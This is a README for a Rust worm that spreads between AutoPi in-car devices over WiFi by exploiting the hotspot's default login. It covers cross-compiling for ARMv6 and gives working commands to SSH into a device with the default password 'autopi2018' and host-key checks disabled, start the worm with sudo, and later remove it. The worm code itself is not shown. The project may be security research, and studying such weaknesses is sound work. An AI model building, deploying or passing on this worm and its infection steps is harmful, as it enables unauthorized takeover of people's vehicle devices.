# AutoPi WiFi Computer Worm
> This is a computer worm that spreads over WiFi using the default credentials of the AutoPi-hotspot
The computer worm is so far only tested on Gen 2 and Gen 1 AutoPis. The instructions below is for this version of AutoPis

## Installation

**Linux**:\
To be able to build the worm for Raspiberry Pi Zero W you need to be able to cross-compile on x86_64/x86 Linux to ARMv6.

First install the correct target for Rust. This is easiest done using [rustup](https://rustup.rs/) (Rusts own package manager):

```sh
rustup target add arm-unknown-linux-gnueabihf
```
(arm-unknown-linux-gnueabi also works)

Then install a linker for cross-compilation to armV6. You can use the [raspberrypi/tools repo](https://github.com/raspberrypi/tools/tree/master/arm-bcm2708) for this, which is a cross-compiler version of GCC inteded for x86_64 Linux to compile to armV6.
(Not the whole git repository is neccesary only arm-bcm2708)

For rustup install of Rust:\
Add to $HOME/.cargo/config
```sh
[target.arm-unknown-linux-gnueabihf]
linker = "<Path to excutable rpi tools for hardware floating point>"
```

Arch Linux has an AUR package for the cross-compiler: arm-bcm2708-linux-gnueabi
With this package on Arch Linux $HOME/.cargo/config should contain:

```sh
[target.arm-unknown-linux-gnueabihf]
linker = "/usr/bin/arm-bcm2708hardfp-linux-gnueabi/gcc"
```
(Similar configuration for arm-unknown-linux-gnueabi is also possible and the non-hardfp linker is included in the same repo)

For automatic infection/building cargo-make is required. This is installed by running:
```sh
cargo install cargo-make
```

## Usage

**Start worm on AutoPi**:\
To start worm log onto the WiFi of an AutoPi. Then run the '''start_infection.sh''' script.
SSH to the AutoPi (this requires cargo-make for automatic building of the worm):
```sh
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@192.168.4.1
```
or
```sh
sshpass -p 'autopi2018' ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@192.168.4.1
```
if using sshpass.

Start worm by running ` sudo setsid ./start.sh & ` in /home/pi (default folder).

**Remove worm**:\
Remove worm by SSH-ing to the infected AutoPi:
```sh
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@192.168.4.100
```
or
```sh
sshpass -p 'autopi2018' ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@192.168.4.100
```

Then run ` sudo setsid ./remove_worm.sh & ` in /home/pi.


